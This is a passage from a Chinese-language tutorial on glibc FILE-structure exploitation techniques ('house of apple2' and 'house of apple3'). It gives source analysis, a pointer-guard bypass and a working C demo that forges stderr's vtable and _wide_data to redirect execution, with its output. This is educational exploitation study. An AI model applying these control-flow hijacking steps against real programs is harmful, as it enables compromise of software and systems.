class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_mode &lt; <span class="number">0</span> || (fp-&gt;_mode == <span class="number">0</span> &amp;&amp; _IO_fwide (fp, <span class="number">1</span>) != <span class="number">1</span>))</span><br><span class="line">    <span class="keyword">return</span> WEOF;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_mode == <span class="number">0</span>)</span><br><span class="line">    _IO_fwide (fp, <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span> (_IO_in_put_mode (fp))</span><br><span class="line">    <span class="keyword">if</span> (_IO_switch_to_wget_mode (fp) == EOF)</span><br><span class="line">      <span class="keyword">return</span> WEOF;</span><br><span class="line">    <span class="comment">// ......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>要想调用到<code>_IO_switch_to_wget_mode</code>，需要设置<code>fp-&gt;mode &gt; 0</code>，并且<code>fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING != 0</code>。</p><p>然后在<code>_IO_switch_to_wget_mode</code>函数中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_switch_to_wget_mode (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">wint_t</span>)_IO_WOVERFLOW (fp, WEOF) == WEOF) <span class="comment">// 需要走到这里</span></span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    <span class="comment">// .....</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当满足fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base时就会调用_IO_WOVERFLOW(fp)。</p><h2 id="示例-5"><a href="#示例-5" class="headerlink" title="示例"></a>示例</h2><p>以下面提到的<code>_IO_wdefault_xsgetn</code>函数利用为例，编写<code>demo</code>示例如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">backdoor</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m[!] Backdoor is called!\n&quot;</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="type">char</span> *p1 = <span class="built_in">calloc</span>(<span class="number">0x200</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="type">char</span> *p2 = <span class="built_in">calloc</span>(<span class="number">0x200</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] allocate two 0x200 chunks&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="type">size_t</span> puts_addr = (<span class="type">size_t</span>)&amp;<span class="built_in">puts</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] puts address: %p\n&quot;</span>, (<span class="type">void</span> *)puts_addr);</span><br><span class="line">    <span class="type">size_t</span> libc_base_addr = puts_addr - <span class="number">0x84420</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] libc base address: %p\n&quot;</span>, (<span class="type">void</span> *)libc_base_addr);</span><br><span class="line"> </span><br><span class="line">    <span class="type">size_t</span> _IO_2_1_stderr_addr = libc_base_addr + <span class="number">0x1ed5c0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] _IO_2_1_stderr_ address: %p\n&quot;</span>, (<span class="type">void</span> *)_IO_2_1_stderr_addr);</span><br><span class="line"> </span><br><span class="line">    <span class="type">size_t</span> _IO_wstrn_jumps_addr = libc_base_addr + <span class="number">0x1e8c60</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] _IO_wstrn_jumps address: %p\n&quot;</span>, (<span class="type">void</span> *)_IO_wstrn_jumps_addr);</span><br><span class="line"> </span><br><span class="line">    <span class="type">char</span> *stderr2 = (<span class="type">char</span> *)_IO_2_1_stderr_addr;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 1: change stderr-&gt;_flags to 0x800&quot;</span>);</span><br><span class="line">    *(<span class="type">size_t</span> *)stderr2 = <span class="number">0x800</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 2: change stderr-&gt;_mode to 1&quot;</span>);</span><br><span class="line">    *(<span class="type">size_t</span> *)(stderr2 + <span class="number">0xc0</span>) = <span class="number">1</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 3: change stderr-&gt;vtable to _IO_wstrn_jumps-0x20&quot;</span>);</span><br><span class="line">    *(<span class="type">size_t</span> *)(stderr2 + <span class="number">0xd8</span>) = _IO_wstrn_jumps_addr<span class="number">-0x20</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 4: replace stderr-&gt;_wide_data with the allocated chunk p1&quot;</span>);</span><br><span class="line">    *(<span class="type">size_t</span> *)(stderr2 + <span class="number">0xa0</span>) = (<span class="type">size_t</span>)p1;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 5: set stderr-&gt;_wide_data-&gt;_wide_vtable with the allocated chunk p2&quot;</span>);</span><br><span class="line">    *(<span class="type">size_t</span> *)(p1 + <span class="number">0xe0</span>) = (<span class="type">size_t</span>)p2;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 6: set stderr-&gt;_wide_data-&gt;_wide_vtable-&gt;_IO_write_ptr &gt;  stderr-&gt;_wide_data-&gt;_wide_vtable-&gt;_IO_write_base&quot;</span>);</span><br><span class="line">    *(<span class="type">size_t</span> *)(p1 + <span class="number">0x20</span>) = (<span class="type">size_t</span>)<span class="number">1</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 7: put backdoor at fake _wide_vtable-&gt;_overflow&quot;</span>);</span><br><span class="line">    *(<span class="type">size_t</span> *)(p2 + <span class="number">0x18</span>) = (<span class="type">size_t</span>)(&amp;backdoor);</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 8: call fflush(stderr) to trigger backdoor func&quot;</span>);</span><br><span class="line">    fflush(<span class="built_in">stderr</span>);</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[*] allocate two <span class="number">0x200</span> chunks</span><br><span class="line">[*] <span class="built_in">puts</span> address: <span class="number">0x7f8f73d2e420</span></span><br><span class="line">[*] libc base address: <span class="number">0x7f8f73caa000</span></span><br><span class="line">[*] _IO_2_1_stderr_ address: <span class="number">0x7f8f73e975c0</span></span><br><span class="line">[*] _IO_wstrn_jumps address: <span class="number">0x7f8f73e92c60</span></span><br><span class="line">[+] step <span class="number">1</span>: change <span class="built_in">stderr</span>-&gt;_flags to <span class="number">0x800</span></span><br><span class="line">[+] step <span class="number">2</span>: change <span class="built_in">stderr</span>-&gt;_mode to <span class="number">1</span></span><br><span class="line">[+] step <span class="number">3</span>: change <span class="built_in">stderr</span>-&gt;vtable to _IO_wstrn_jumps<span class="number">-0x20</span></span><br><span class="line">[+] step <span class="number">4</span>: replace <span class="built_in">stderr</span>-&gt;_wide_data with the allocated chunk p1</span><br><span class="line">[+] step <span class="number">5</span>: <span class="built_in">set</span> <span class="built_in">stderr</span>-&gt;_wide_data-&gt;_wide_vtable with the allocated chunk p2</span><br><span class="line">[+] step <span class="number">6</span>: <span class="built_in">set</span> <span class="built_in">stderr</span>-&gt;_wide_data-&gt;_wide_vtable-&gt;_IO_write_ptr &gt;  <span class="built_in">stderr</span>-&gt;_wide_data-&gt;_wide_vtable-&gt;_IO_write_base</span><br><span class="line">[+] step <span class="number">7</span>: put backdoor at fake _wide_vtable-&gt;_overflow</span><br><span class="line">[+] step <span class="number">8</span>: call <span class="title function_">fflush</span><span class="params">(<span class="built_in">stderr</span>)</span> to trigger backdoor func</span><br><span class="line">[!] Backdoor is called!</span><br></pre></td></tr></table></figure><h1 id="house-of-apple3"><a href="#house-of-apple3" class="headerlink" title="house of apple3"></a>house of apple3</h1><h2 id="概要-16"><a href="#概要-16" class="headerlink" title="概要"></a>概要</h2><p><strong>简介:</strong><code>house of apple1</code>中的利用链能<strong>任意地址写堆地址</strong>，<code>house of apple2</code>中的利用链能通过控制<code>FILE</code>结构体的<code>_wide_data</code>成员去<strong>直接控制程序执行流。</strong><code>house of apple3</code>则关注<code>FILE</code>结构体的另外一个成员<code>_codecvt</code>的利用。</p><p><strong>利用条件:</strong></p><ol><li>能控制程序执行<code>IO</code>操作，包括但不限于：从<code>main</code>函数返回、调用<code>exit</code>函数、通过<code>__malloc_assert</code>触发</li><li>能够泄露堆地址和libc基址</li><li>能控制<code>_IO_FILE</code>的<code>vtable</code>和<code>_codecvt</code>，一般使用<code>largebin attack</code>去控制</li></ol><p><strong>利用效果:</strong>控制流</p><p><strong>有效版本:</strong>ALL</p><h2 id="原理-16"><a href="#原理-16" class="headerlink" title="原理"></a>原理</h2><p><code>FILE</code>结构体中有一个成员<code>struct _IO_codecvt *_codecvt;</code>，偏移为<code>0x98</code>。该结构体参与宽字符的转换工作，结构体被定义为：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// libio\libio.h:115</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  _IO_iconv_t __cd_in;</span><br><span class="line">  _IO_iconv_t __cd_out;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// libio\libio.h:51</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> __<span class="title">gconv_step</span> *<span class="title">step</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> __<span class="title">gconv_step_data</span> <span class="title">step_data</span>;</span></span><br><span class="line">&#125; _IO_iconv_t;</span><br></pre></td></tr></table></figure><p>__gconv_step:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// iconv\gconv.h:84</span></span><br><span class="line"><span class="comment">/* Description of a conversion step.  */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> __<span class="title">gconv_step</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> __<span class="title">gconv_loaded_object</span> *__<span class="title">shlib_handle</span>;</span><span class="comment">// 关注这个成员</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *__modname;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* For internal use by glibc.  (Accesses to this member must occur</span></span><br><span class="line"><span class="comment">     when the internal __gconv_lock mutex is acquired).  */</span></span><br><span class="line">  <span class="type">int</span> __counter;</span><br><span class="line"> </span><br><span class="line">  <span class="type">char</span> *__from_name;</span><br><span class="line">  <span class="type">char</span> *__to_name;</span><br><span class="line"> </span><br><span class="line">  __gconv_fct __fct;<span class="comment">// 关注这个成员</span></span><br><span class="line">  __gconv_btowc_fct __btowc_fct;</span><br><span class="line">  __gconv_init_fct __init_fct;</span><br><span class="line">  __gconv_end_fct __end_fct;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Information about the number of bytes needed or produced in this</span></span><br><span class="line"><span class="comment">     step.  This helps optimizing the buffer sizes.  */</span></span><br><span class="line">  <span class="type">int</span> __min_needed_from;</span><br><span class="line">  <span class="type">int</span> __max_needed_from;</span><br><span class="line">  <span class="type">int</span> __min_needed_to;</span><br><span class="line">  <span class="type">int</span> __max_needed_to;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Flag whether this is a stateful encoding or not.  */</span></span><br><span class="line">  <span class="type">int</span> __stateful;</span><br><span class="line"> </span><br><span class="line">  <span class="type">void</span> *__data;        <span class="comment">/* Pointer to step-local data.  */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>__gconv_step_data:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Additional data for steps in use of conversion descriptor.  This is</span></span><br><span class="line"><span class="comment">   allocated by the `init&#x27; function.  */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> __<span class="title">gconv_step_data</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> *__outbuf;    <span class="comment">/* Output buffer for this step.  */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> *__outbufend; <span class="comment">/* Address of first byte after the output</span></span><br><span class="line"><span class="comment">                 buffer.  */</span></span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Is this the last module in the chain.  */</span></span><br><span class="line">  <span class="type">int</span> __flags;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Counter for number of invocations of the module function for this</span></span><br><span class="line"><span class="comment">     descriptor.  */</span></span><br><span class="line">  <span class="type">int</span> __invocation_counter;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Flag whether this is an internal use of the module (in the mb*towc*</span></span><br><span class="line"><span class="comment">     and wc*tomb* functions) or regular with iconv(3).  */</span></span><br><span class="line">  <span class="type">int</span> __internal_use;</span><br><span class="line"> </span><br><span class="line">  <span class="type">__mbstate_t</span> *__statep;</span><br><span class="line">  <span class="type">__mbstate_t</span> __state;    <span class="comment">/* This element must not be used directly by</span></span><br><span class="line"><span class="comment">               any module; always use STATEP!  */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>以上两个结构体均会被用于字符转换，而在利用的过程中，需要精准控制结构体中的某些成员，避免引发内存访问错误。</p><p><code>house of apple3</code>的利用主要关注以下三个函数：<code>__libio_codecvt_out</code>、<code>__libio_codecvt_in</code>和<code>__libio_codecvt_length</code>。</p><p>三个函数定义在glibc\libio\iofwide.c</p><p>三个函数的利用点都差不多，以<code>__libio_codecvt_in</code>为例，源码分析如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> __<span class="title">codecvt_result</span></span></span><br><span class="line"><span class="class">__<span class="title">libio_codecvt_in</span> (<span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *<span class="title">codecvt</span>, __<span class="title">mbstate_t</span> *<span class="title">statep</span>,</span></span><br><span class="line"><span class="class">            <span class="title">const</span> <span class="title">char</span> *<span class="title">from_start</span>, <span class="title">const</span> <span class="title">char</span> *<span class="title">from_end</span>,</span></span><br><span class="line"><span class="class">            <span class="title">const</span> <span class="title">char</span> **<span class="title">from_stop</span>,</span></span><br><span class="line"><span class="class">            <span class="title">wchar_t</span> *<span class="title">to_start</span>, <span class="title">wchar_t</span> *<span class="title">to_end</span>, <span class="title">wchar_t</span> **<span class="title">to_stop</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">enum</span> __<span class="title">codecvt_result</span> <span class="title">result</span>;</span></span><br><span class="line">  <span class="comment">// gs 源自第一个参数</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> __<span class="title">gconv_step</span> *<span class="title">gs</span> =</span> codecvt-&gt;__cd_in.step;</span><br><span class="line">  <span class="type">int</span> status;</span><br><span class="line">  <span class="type">size_t</span> dummy;</span><br><span class="line">  <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *from_start_copy = (<span class="type">unsigned</span> <span class="type">char</span> *) from_start;</span><br><span class="line"> </span><br><span class="line">  codecvt-&gt;__cd_in.step_data.__outbuf = (<span class="type">unsigned</span> <span class="type">char</span> *) to_start;</span><br><span class="line">  codecvt-&gt;__cd_in.step_data.__outbufend = (<span class="type">unsigned</span> <span class="type">char</span> *) to_end;</span><br><span class="line">  codecvt-&gt;__cd_in.step_data.__statep = statep;</span><br><span class="line"> </span><br><span class="line">  __gconv_fct fct = gs-&gt;__fct;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  <span class="comment">// 如果gs-&gt;__shlib_handle不为空，则会用__pointer_guard去解密</span></span><br><span class="line">  <span class="comment">// 这里如果可控，设置为NULL即可绕过解密</span></span><br><span class="line">  <span class="keyword">if</span> (gs-&gt;__shlib_handle != <span class="literal">NULL</span>)</span><br><span class="line">    PTR_DEMANGLE (fct);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  <span class="comment">// 这里有函数指针调用</span></span><br><span class="line">  <span class="comment">// 这个宏就是调用fct(gs, ...)</span></span><br><span class="line">  status = DL_CALL_FCT (fct,</span><br><span class="line">            (gs, &amp;codecvt-&gt;__cd_in.step_data, &amp;from_start_copy,</span><br><span class="line">             (<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *) from_end, <span class="literal">NULL</span>,</span><br><span class="line">             &amp;dummy, <span class="number">0</span>, <span class="number">0</span>));</span><br><span class="line">       <span class="comment">// ......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中，<code>__gconv_fct</code>和<code>DL_CALL_FCT</code>被定义为：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Type of a conversion function.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">int</span> <span class="params">(*__gconv_fct)</span> <span class="params">(<span class="keyword">struct</span> __gconv_step *, <span class="keyword">struct</span> __gconv_step_data *,</span></span><br><span class="line"><span class="params">                <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> **, <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *,</span></span><br><span class="line"><span class="params">                <span class="type">unsigned</span> <span class="type">char</span> **, <span class="type">size_t</span> *, <span class="type">int</span>, <span class="type">int</span>)</span>;</span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> DL_CALL_FCT</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> DL_CALL_FCT(fct, args) fct args</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>而在<code>_IO_wfile_underflow</code>函数中调用了<code>__libio_codecvt_in</code>，代码片段如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">wint_t</span></span><br><span class="line">_IO_wfile_underflow (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *<span class="title">cd</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">enum</span> __<span class="title">codecvt_result</span> <span class="title">status</span>;</span></span><br><span class="line">  <span class="type">ssize_t</span> count;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* C99 requires EOF to be &quot;sticky&quot;.  */</span></span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 不能进入这个分支</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_EOF_SEEN)</span><br><span class="line">    <span class="keyword">return</span> WEOF;</span><br><span class="line">  <span class="comment">// 不能进入这个分支</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (fp-&gt;_flags &amp; _IO_NO_READS))</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> WEOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">// 不能进入这个分支</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_read_ptr &lt; fp-&gt;_wide_data-&gt;_IO_read_end)</span><br><span class="line">    <span class="keyword">return</span> *fp-&gt;_wide_data-&gt;_IO_read_ptr;</span><br><span class="line"> </span><br><span class="line">  cd = fp-&gt;_codecvt;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 需要进入这个分支</span></span><br><span class="line">  <span class="comment">/* Maybe there is something left in the external buffer.  */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* There is more in the external.  Convert it.  */</span></span><br><span class="line">      <span class="type">const</span> <span class="type">char</span> *read_stop = (<span class="type">const</span> <span class="type">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line"> </span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_last_state = fp-&gt;_wide_data-&gt;_IO_state;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_base = fp-&gt;_wide_data-&gt;_IO_read_ptr =</span><br><span class="line">    fp-&gt;_wide_data-&gt;_IO_buf_base;</span><br><span class="line">    <span class="comment">// 需要一路调用到这里</span></span><br><span class="line">      status = __libio_codecvt_in (cd, &amp;fp-&gt;_wide_data-&gt;_IO_state,</span><br><span class="line">                   fp-&gt;_IO_read_ptr, fp-&gt;_IO_read_end,</span><br><span class="line">                   &amp;read_stop,</span><br><span class="line">                   fp-&gt;_wide_data-&gt;_IO_read_ptr,</span><br><span class="line">                   fp-&gt;_wide_data-&gt;_IO_buf_end,</span><br><span class="line">                   &amp;fp-&gt;_wide_data-&gt;_IO_read_end);</span><br><span class="line">           <span class="comment">// ......</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而<code>_IO_wfile_underflow</code>又是<code>_IO_wfile_jumps</code>这个<code>_IO_jump_t</code>类型变量的成员函数。</p><p>分析到这里，利用原理就呼之欲出了：劫持或者伪造<code>FILE</code>结构体的<code>fp-&gt;vtable</code>为<code>_IO_wfile_jumps</code>，<code>fp-&gt;_codecvt</code>为可控堆地址，当程序执行<code>IO</code>操作时，控制程序执行流走到<code>_IO_wfile_underflow</code>，设置好<code>fp-&gt;codecvt-&gt;__cd_in</code>结构体，使得最终调用到<code>__libio_codecvt_in</code>中的<code>DL_CALL_FCT</code>宏，伪造函数指针，进而控制程序执行流。</p><p>注意，在伪造过程中，可以设置<code>gs-&gt;__shlib_handle == NULL</code>，从而绕过<code>__pointer_guard</code>的指针调用保护。</p><hr><p><strong>注意：</strong><br>因为<code>_wide_data</code>设置不当的话会影响某些利用链的分支走向。但是，如果采用默认的<code>_wide_data</code>成员（默认会指向<code>_IO_wide_data_2</code>，除了<code>_wide_vtable</code>外其他成员均默认为<code>0</code>），也并不影响<code>house of apple3</code>的利用。</p><p>因此，如果能伪造整个<code>FILE</code>结构体，则需要设置合适的<code>_wide_data</code>；如果只能伪部分<code>FILE</code>的成员的话，保持<code>fp-&gt;_wide_data</code>为默认地址即可</p><h2 id="利用-2"><a href="#利用-2" class="headerlink" title="利用"></a>利用</h2><p>目前在<code>glibc</code>源码中搜索到的<code>__libio_codecvt_in/__libio_codecvt_out/__libio_codecvt_length</code>的调用链比较多</p><h3 id="利用-IO-wfile-underflow函数控制程序执行流"><a href="#利用-IO-wfile-underflow函数控制程序执行流" class="headerlink" 